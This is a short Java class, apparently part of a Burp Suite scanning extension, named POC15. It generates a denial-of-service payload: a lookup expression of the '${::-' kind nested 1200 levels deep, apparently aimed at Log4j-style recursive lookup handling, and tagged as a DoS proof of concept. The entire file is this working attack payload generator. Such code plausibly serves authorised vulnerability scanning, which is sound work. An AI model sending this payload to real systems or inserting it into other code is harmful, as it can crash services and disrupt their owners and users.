package burp.poc.impl;

import burp.poc.IPOC;
import burp.utils.Utils;

public class POC15 implements IPOC {
    @Override
    public String generate(String domain) {
        return "${" + "${::-".repeat(1200) + "$${::-j}" + "}".repeat(1200) + "}";

    }

    @Override
    public int getType() {
        return POC_TYPE_DOS;
    }
}
